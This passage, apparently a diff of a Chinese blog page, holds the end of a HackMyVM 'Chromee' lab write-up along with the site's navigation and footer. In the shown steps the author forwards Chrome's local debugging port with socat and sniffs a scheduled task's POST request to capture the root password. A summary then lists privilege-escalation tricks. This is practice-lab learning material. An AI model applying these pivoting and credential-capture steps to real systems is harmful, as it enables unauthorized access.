</span><br><span class="line">tcp            LISTEN          0               511                                  *:8080                               *:*                             </span><br><span class="line">tcp            LISTEN          0               128                               [::]:22                              [::]:*    </span><br></pre></td></tr></table></figure></div>
+<p>现在上传一个socat，然后转发一下端口</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">softly@Chromee:~$ ./socat TCP-LISTEN:9999,fork TCP4:127.0.0.1:9222 &amp;</span><br><span class="line">[3] 18212</span><br></pre></td></tr></table></figure></div>
+<p>因为现在是调试过程，要到浏览器中chrome:&#x2F;&#x2F;inspectl里面新加一个<br><img src="https://pic1.imgdb.cn/item/67e7b7f10ba3d5a1d7e63e51.png"><br>点击inspect<br>因为我们知道有一个定时任务，就是就在这个调试页面等，过了一会，发现有一个请求包 ，传来一个post请求包<br><img src="https://pic1.imgdb.cn/item/67e7b8810ba3d5a1d7e640b3.png"><br>这就是root的密码了</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
+<li>学到了bypass是什么以及怎么用</li>
+<li>给了一个文件的提示用cupp</li>
+<li>…隐藏文件</li>
+<li>出了sudo还有doas命令也能有其他用户的执行权限</li>
+<li>得到密码除了可能是其他用户的，还有可能是自己的密码</li>
+<li>看一个py程序可以尝试是否能找到可以写入的包，提权</li>
+<li>socat转发端口</li>
+<li>学习了chromium这个命令，了解了一些参数，以及谷歌浏览器的调试窗口</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/46850.html" title="HMV-Chromee WP复现及复盘">https://guayu-kakeru.github.io/posts/46850.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
+              <a href="/tags/HMV/" rel="tag"># HMV</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/37991.html" rel="prev" title="NSSRound#28web方向wp">
+      <i class="fa fa-chevron-left"></i> NSSRound#28web方向wp
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web%E6%8E%A2%E6%B5%8B"><span class="nav-text">web探测</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#follower"><span class="nav-text">follower</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#softly"><span class="nav-text">softly</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">69</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayu-kakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayu-kakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/46850.html" title="posts&#x2F;46850.html">HMV-Chromee WP复现及复盘</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/37991.html" title="posts&#x2F;37991.html">NSSRound#28web方向wp</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/62478.html" title="posts&#x2F;62478.html">HMV-easypwn WP复现与复盘</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/51504.html" title="posts&#x2F;51504.html">HTTP请求走私漏洞学习</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/57863.html" title="posts&#x2F;57863.html">HMV-Driftingblues3</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
